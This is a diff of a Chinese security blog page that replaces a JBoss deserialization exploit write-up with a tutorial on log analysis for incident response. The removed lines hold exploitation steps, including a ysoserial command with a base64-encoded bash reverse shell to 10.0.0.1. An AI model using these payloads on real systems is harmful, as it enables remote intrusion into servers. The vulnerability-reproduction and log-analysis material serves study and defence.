@@ -75,7 +75,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现," />
+  <meta name="keywords" content="入侵分析," />
 
 
 
@@ -86,22 +86,18 @@
 
 
 
-<meta name="description" content="CVE-2017-12149、CVE-2017-7504、JMXInvokerServlet-deserialization">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)">
+<meta name="keywords" content="入侵分析">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Jboss">
-<meta property="og:url" content="http://yoursite.com/2018/07/09/jboss/index.html">
+<meta property="og:title" content="日志分析">
+<meta property="og:url" content="http://yoursite.com/2018/07/29/日志分析/index.html">
 <meta property="og:site_name" content="BEHIND THE GROWTH">
-<meta property="og:description" content="CVE-2017-12149、CVE-2017-7504、JMXInvokerServlet-deserialization">
+<meta property="og:description" content="Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2018/07/09/jboss/post.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/09/jboss/post2.png">
-<meta property="og:image" content="http://yoursite.com/2018/07/09/jboss/post3.png">
-<meta property="og:updated_time" content="2018-08-19T07:53:57.788Z">
+<meta property="og:updated_time" content="2018-08-02T06:30:59.235Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Jboss">
-<meta name="twitter:description" content="CVE-2017-12149、CVE-2017-7504、JMXInvokerServlet-deserialization">
-<meta name="twitter:image" content="http://yoursite.com/2018/07/09/jboss/post.png">
+<meta name="twitter:title" content="日志分析">
+<meta name="twitter:description" content="Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)">
 
 
 
@@ -131,13 +127,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/07/09/jboss/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/07/29/日志分析/"/>
 
 
 
 
 
-  <title>Jboss | BEHIND THE GROWTH</title>
+  <title>日志分析 | BEHIND THE GROWTH</title>
   
 
 
@@ -264,7 +260,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/09/jboss/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/29/日志分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="WyyFree">
@@ -281,7 +277,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Jboss</h1>
+          <h1 class="post-title" itemprop="name headline">日志分析</h1>
         
 
         <div class="post-meta">
@@ -293,8 +289,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-09T16:30:00+08:00">
-                2018-07-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-29T15:17:00+08:00">
+                2018-07-29
               </time>
             
 
@@ -316,8 +312,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
+                  <a href="/categories/安全审计/" itemprop="url" rel="index">
+                    <span itemprop="name">安全审计</span>
                   </a>
                 </span>
 
@@ -340,7 +336,7 @@
 
           
               <div class="post-description">
-                  CVE-2017-12149、CVE-2017-7504、JMXInvokerServlet-deserialization
+                  Linux日志分析(awk,grep,wc...)，Windows日是分析(LogParser)
               </div>
           
 
@@ -357,48 +353,114 @@
       
 
       
-        <h2 id="CVE-2017-12149-CVE-2017-7504-JMXInvokerServlet-deserialization"><a href="#CVE-2017-12149-CVE-2017-7504-JMXInvokerServlet-deserialization" class="headerlink" title="CVE-2017-12149/CVE-2017-7504/JMXInvokerServlet-deserialization"></a>CVE-2017-12149/CVE-2017-7504/JMXInvokerServlet-deserialization</h2><center>
-
-<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p></p></center><p></p>
-<ul>
-<li>原理</li>
-</ul>
-<p>1、CVE-2017-12149: 该漏洞为 Java反序列化错误类型，存在于 Jboss 的 <strong>HttpInvoker</strong> 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
-<p>2、CVE-2017-7504: Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的<strong>HTTPServerILServlet.java</strong>文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。</p>
-<p>3、JMXInvokerServlet-deserialization: 这是经典的JBoss反序列化漏洞，JBoss在<strong>invoker/JMXInvokerServlet</strong>请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的Gadget执行任意代码。</p>
-<ul>
-<li>漏洞位置</li>
-</ul>
-<p>1、CVE-2017-12149: 该漏洞出现在<code>/invoker/readonly</code>请求中，服务器将用户提交的POST内容进行了Java反序列化(请求后显示服务器端错误500),请求中直接将生成好的exp.ser附在POST Body中POST发送即可<br>2、CVE-2017-7504: 该漏洞出现在<code>/jbossmq-httpil/HTTPServerILServlet</code>请求中直接将生成好的exp.ser附在POST Body中POST发送即可<br>3、JMXInvokerServlet-deserialization: JBoss在处理<code>/invoker/JMXInvokerServlet</code>请求的时候读取了对象，所以我们直接将生成好的exp.ser附在POST Body中POST发送即可</p>
+        <p><hr></p>
 <center>
 
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p></p></center><p></p>
-<ul>
-<li>EXP(CVE-2017-12149/CVE-2017-7504/JMXInvokerServlet-deserialization)</li>
+<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p></p></center><p></p>
+<h3 id="日志文件-var-log"><a href="#日志文件-var-log" class="headerlink" title="日志文件(/var/log)"></a>日志文件(/var/log)</h3><ul>
+<li>日志文件配置(<strong>/etc/rsyslog.conf[syslog.conf]</strong>)：用于控制/var/log下的日志文件记录的内容<br>配置文件说明<br>参数格式：类型.级别[;类型.级别]&nbsp;&nbsp;&nbsp;&nbsp;动作<br>类型：<pre><code>auth    认证系统，即询问用户名和口令(syslog)
+authpriv   权限使用相关信息(auth.log/secure)
+user    本地用户应用程序的syslog信息
+cron    系统定时系统执行定时任务时发出的信息
+daemon  某些系统的守护程序的syslog,如由in.ftpd产生的log
+kern    内核的syslog信息
+lpr     打印机的syslog信息
+mail    邮件系统的syslog信息
+mark    定时发送消息的时标程序
+news    新闻系统的syslog信息
+uucp    uucp子系统的syslog信息
+local0..7 种本地类型的syslog信息,这些信息可以又用户来定义
+*       代表以上各种设备
+</code></pre>级别<pre><code>emerg   紧急，处于Panic状态。通常应广播到所有用户； 
+alert   告警，当前状态必须立即进行纠正。例如，系统数据库崩溃； 
+crit    关键状态的警告。例如，硬件故障； 
+err     其它错误； 
+warning 警告； 
+notice  注意；非错误状态的报告，但应特别处理； 
+info    通报信息； 
+debug   调试程序时的信息； 
+none    通常调试程序时用，指示带有none级别的类型产生的信息无需送出。如*.debug;mail.none表示调试时除邮件信息外其它信息都送出。
+</code></pre>动作<pre><code>/filename   日志文件。由绝对路径指出的文件名，此文件必须事先建立； 
+@host       远程主机； @符号后面可以是ip,也可以是域名，默认在/etc/hosts文件下loghost这个别名已经指定给了本机。
+user1,user2 指定用户。如果指定用户已登录，那么他们将收到信息； 
+*           所有用户。所有已登录的用户都将收到信息。
+</code></pre></li>
+<li>其他日志<br>/var/log/btmp 记录错误的登录尝试(auth/secure)。<br>/var/log/wtmp 记录所有登入登出。<br>&nbsp;&nbsp;&nbsp;&nbsp;last -f wtmp<br>/var/log/lastlog 记录每个用户最后登入信息。<br>&nbsp;&nbsp;&nbsp;&nbsp;command：last<br>/var/run/utmp 记录现在登入的用户。<br>&nbsp;&nbsp;&nbsp;&nbsp;command：w/who</li>
 </ul>
-<p>1、直接反弹shell  <a href="http://scan.javasec.cn/java/JavaDeserH2HC.zip" target="_blank" rel="noopener">工具</a></p>
-<pre><code>#生成ReverseShellCommonsCollectionsHashMap
-javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java
-#使用ReverseShellCommonsCollectionsHashMap生成ReverseShellCommonsCollectionsHashMap.ser，ip：port
-为反弹的端口
-java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap ip:port[&quot;command&quot;]
-</code></pre><p>通过BP上传文件（paste from file）返回会话</p>
+<p><hr></p>
+<center>
+
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p></p></center><p></p>
+<h3 id="事件查看器"><a href="#事件查看器" class="headerlink" title="事件查看器"></a>事件查看器</h3><p>打开事件管理器(开始—管理工具—事件查看/开始运行eventvwr)<br>Windows server 2008 系列参考 event ID :</p>
+<pre><code>4624 - 帐户已成功登录 
+4625 - 帐户登录失败 
+4648 - 试图使用明确的凭证登录(例如远程桌面）
+</code></pre><h3 id="分析方法"><a href="#分析方法" class="headerlink" title="分析方法"></a>分析方法</h3><ol>
+<li>主要分析安全日志,可以借助自带的筛选功能</li>
+<li>可以把日志导出为文本格式,然后使用文本编译器打开,使用正则模式去匹配或者过滤远程登录过的IP地址,在界定事件日期范围的基础<pre><code>正则匹配IP
+((?:(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))).){3}(?:25[0-5]|2[0-4]\d|((1\d{2})|([1-9]?\d))))
+</code></pre></li>
+<li>日志分析工具Log Parser</li>
+</ol>
+<p><hr></p>
+<center>
+
+<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p></p></center><p></p>
 <ul>
-<li>CVE-2017-12149</li>
+<li><p>常用中间件类型：<br>  apache<br>日志文件配置位置：apache.conf[httpd.conf]<br>  nginx<br>日志文件配置位置：nginx.conf<br>  tomcat<br>日志文件配置位置：conf/server.xml<br>  IIS<br>日志文件配置位置：日志 -&gt; 目录 -&gt; 浏览</p>
+</li>
+<li><p>无论任何web服务器其实日志需要关注的东西是一致的,即access_log和error_log。</p>
+</li>
+<li>排查方法：<br>  1、确定攻击时间范围<br>  2、确定攻击载荷<br>  3、确定攻击IP</li>
 </ul>
-<p><img src="/2018/07/09/jboss/post.png" alt="post"></p>
+<p><hr></p>
+<center>
+
+<h2 id="文本内容筛选"><a href="#文本内容筛选" class="headerlink" title="文本内容筛选"></a>文本内容筛选</h2><p></p></center><p></p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><center>Linux</center></p>
 <ul>
-<li>CVE-2017-7504</li>
+<li>cat：查看文件内容<pre><code>cat file1 file2
+cat *.log
+cat access*
+</code></pre></li>
+<li>more|head|tail|wc<pre><code>cat file | more[less] #分页显示,less可在显示也搜索(/?)
+cat file | head[tail] -n LINE #输出前[末尾]n行
+cat file | tail -f #实时显示刷新内容
+cat file | wc -l #统计行数
+</code></pre></li>
+<li>grep<pre><code>cat file | grep &quot;STR&quot;
+常用参数：
+    -r STR：当前目录文件内容关键字搜索
+    -v STR：排除包含STR的行
+    -i STR：忽略大小写
+    -n：在前面显示行数
+</code></pre></li>
+<li>awk：分离行匹配输出<pre><code>输出，$0：整行，-F：指定分割的符号(默认空格)
+awk -F &apos;str&apos; &apos;{print $field}&apos;
+去重
+&apos;!a[$filed]++{print $field}&apos;
+判断
+&apos;{if($field==continue)print $0}&apos;
+切割
+&apos;{split($field,value,str);print value[i]}&apos;
+</code></pre></li>
+<li>用例<pre><code>cat *.log | awk &apos;!a[$3]++{print $3}&apos;
+cat file | awk &apos;{split($1,a,&quot;-&quot;);if(a[3]==20)print $0}&apos; | more
+</code></pre></li>
 </ul>
-<p><img src="/2018/07/09/jboss/post2.png" alt="post"></p>
+<p><center>Windows</center></p>
 <ul>
-<li>JMXInvokerServlet-deserialization</li>
+<li>Logparser<br>1、格式<pre><code>logparser -i:evt -o:[datagrid] &quot;SQL&quot;
+参数：
+-i：输入源
+-o：输出源(net[默认]、datagrid、csv)
+SQL：查询语句
+</code></pre>2、用例<pre><code>Logparser.exe –i:EVT –o:DATAGRID “SELECT * FROM E:\logparser\xx.evtx”
+LogParser.exe -i:EVT &quot;SELECT TimeGenerated,EXTRACT\_TOKEN(Strings,0,&apos;|&apos;) AS USERNAME,EXTRACT\_TOKEN(Strings,2,&apos;|&apos;) AS SERVICE\_NAME,EXTRACT\_TOKEN(Strings,5,&apos;|&apos;) AS Client\_IP FROM &apos;e:\logparser\xx.evtx&apos; WHERE EventID=675 AND EXTRACT\_TOKEN(Strings,5,&apos;|&apos;)=&apos;x.x.x.x&apos;&quot;
+</code></pre>3、用logparser导出成csv格式(数据在同一行)<pre><code>Logparser.exe –i:EVT –o:csv “SELECT * FROM E:\logparser\xx.evtx” &gt; new.csv
+如果在Linux上打开会出现乱码，需要word重新打开保存
+</code></pre></li>
 </ul>
-<p><img src="/2018/07/09/jboss/post3.png" alt="post"></p>
-<p>2、用过饭序列化工具生成poc.ser文件执行命令  <a href="http://jackson.thuraisamy.me/runtime-exec-payloads.html" target="_blank" rel="noopener">编码</a></p>
-<pre><code>#执行命令中含有管道符特殊符号的需要先编码成bash64，导入出到ser文件
-java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS8yMSAwPiYx}|{base64,-d}|{bash,-i}&quot; &gt; poc.ser
-</code></pre><p>通过BP工具POST文件方法发送ser文件即可执行命令<br><strong>执行失败，还在研究中….</strong></p>
 
       
     </div>
@@ -416,7 +478,7 @@ java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAv
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" <i class="fa fa-tag"></i> 漏洞复现</a>
+            <a href="/tags/入侵分析/" <i class="fa fa-tag"></i> 入侵分析</a>
           
         </div>
       
@@ -429,8 +491,8 @@ java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAv
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/07/05/weblogic/" rel="next" title="Weblogic">
-                <i class="fa fa-chevron-left"></i> Weblogic
+              <a href="/2018/07/29/入侵应急分析排查/" rel="next" title="入侵应急分析排查">
+                <i class="fa fa-chevron-left"></i> 入侵应急分析排查
               </a>
             
           </div>
@@ -439,8 +501,8 @@ java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAv
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/07/20/struts2/" rel="prev" title="Struts2">
-                Struts2 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/07/31/Tomcat/" rel="prev" title="Tomcat">
+                Tomcat <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -577,7 +639,7 @@ java -jar ysoserial.jar CommonsCollections5 &quot;bash -c {echo,YmFzaCAtaSA+JiAv
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2017-12149-CVE-2017-7504-JMXInvokerServlet-deserialization"><span class="nav-number">1.</span> <span class="nav-text">CVE-2017-12149/CVE-2017-7504/JMXInvokerServlet-deserialization</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#描述"><span class="nav-number">1.1.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux"><span class="nav-number">1.</span> <span class="nav-text">Linux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#日志文件-var-log"><span class="nav-number">1.1.</span> <span class="nav-text">日志文件(/var/log)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows"><span class="nav-number">2.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#事件查看器"><span class="nav-number">2.1.</span> <span class="nav-text">事件查看器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析方法"><span class="nav-number">2.2.</span> <span class="nav-text">分析方法</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#中间件"><span class="nav-number">3.</span> <span class="nav-text">中间件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文本内容筛选"><span class="nav-number">4.</span> <span class="nav-text">文本内容筛选</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工具"><span class="nav-number">4.1.</span> <span class="nav-text">工具</span></a></li></ol></li></ol></div>
             
 
           </div>
